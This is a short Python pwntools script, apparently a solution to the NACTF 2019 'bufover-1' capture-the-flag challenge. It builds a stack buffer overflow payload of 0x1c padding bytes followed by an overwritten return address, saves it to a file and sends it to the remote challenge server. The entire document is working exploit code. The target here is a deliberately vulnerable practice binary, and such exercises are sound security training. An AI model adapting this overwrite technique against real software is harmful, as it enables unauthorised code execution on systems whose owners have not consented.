from pwn import *
import subprocess

process = subprocess.Popen(["./bufover-1"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
print (repr(p32(0x080491b2)))
test = (b"A"*0x1c + p32(0x080491b2) + b"\n")
print (test)
f = open("attack.txt", "wb")
f.write(test)

io = remote('shell.2019.nactf.com', 31462)
io.send(test)

print (io.recvline())
print (io.recvline())
print (io.recvline())
